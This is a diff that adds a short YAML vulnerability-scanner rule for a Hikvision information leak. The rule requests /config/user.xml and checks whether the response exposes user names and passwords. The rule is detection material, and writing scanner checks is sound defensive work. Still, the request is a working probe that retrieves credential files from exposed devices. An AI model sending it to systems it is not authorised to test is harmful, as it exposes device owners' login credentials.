@@ -1,0 +1,16 @@
+expression: r0()
+id: hikvision-info-leak
+info:
+  author: tangshoupu
+  name: hikvision-info-leak
+  reference:
+  - https://www.seebug.org/vuldb/ssvid-91762
+  severity: high
+  verified: false
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b'<user name="')
+      && response.body.bcontains(b'password="')
+    request:
+      method: GET
+      path: /config/user.xml
